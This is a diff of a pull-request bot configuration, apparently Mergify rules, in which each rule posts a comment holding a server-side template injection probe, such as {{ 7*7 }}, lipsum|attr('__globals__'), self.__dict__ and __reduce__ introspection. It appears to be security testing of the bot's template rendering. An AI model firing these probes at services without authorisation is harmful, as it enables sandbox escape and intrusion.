@@ -1,63 +1,63 @@
 pull_request_rules:
-  # === COMMENT TESTS — renders template as PR comment ===
-  - name: ssti-comment-1-math
+  # === test-comment-1-1-1783402051 ===
+  - name: ssti-test-comment-1-1
     conditions:
       - base=main
-      - head~=^test-comment-1-math-
+      - head~=test-comment-1-1-
     actions:
       comment:
         message: |
           SSTI-C1: {{ 7*7 }}
-
-  - name: ssti-comment-2-attformat
+  # === test-comment-2-2-1783402054 ===
+  - name: ssti-test-comment-2-2
     conditions:
       - base=main
-      - head~=^test-comment-2-attformat-
+      - head~=test-comment-2-2-
     actions:
       comment:
         message: |
           SSTI-C2: {{ ''|attr('format')('{0.__class__}') }}
-
-  - name: ssti-comment-3-percent
+  # === test-comment-3-3-1783402056 ===
+  - name: ssti-test-comment-3-3
     conditions:
       - base=main
-      - head~=^test-comment-3-percent-
+      - head~=test-comment-3-3-
     actions:
       comment:
         message: |
           SSTI-C3: {{ "%d%%20" % 42 }}
-
-  - name: ssti-comment-4-self
+  # === test-comment-4-4-1783402058 ===
+  - name: ssti-test-comment-4-4
     conditions:
       - base=main
-      - head~=^test-comment-4-self-
+      - head~=test-comment-4-4-
     actions:
       comment:
         message: |
           SSTI-C4: {{ self.__dict__ }}
-
-  - name: ssti-comment-5-globals
+  # === test-comment-5-5-1783402060 ===
+  - name: ssti-test-comment-5-5
     conditions:
       - base=main
-      - head~=^test-comment-5-globals-
+      - head~=test-comment-5-5-
     actions:
       comment:
         message: |
           SSTI-C5: {{ lipsum|attr('__globals__') }}
-
-  - name: ssti-comment-6-reduce
+  # === test-comment-6-6-1783402062 ===
+  - name: ssti-test-comment-6-6
     conditions:
       - base=main
-      - head~=^test-comment-6-reduce-
+      - head~=test-comment-6-6-
     actions:
       comment:
         message: |
           SSTI-C6: {{ "".__class__|attr("__reduce__") }}
-
-  - name: ssti-comment-7-getsection
+  # === test-comment-7-7-1783402064 ===
+  - name: ssti-test-comment-7-7
     conditions:
       - base=main
-      - head~=^test-comment-7-getsection-
+      - head~=test-comment-7-7-
     actions:
       comment:
         message: |
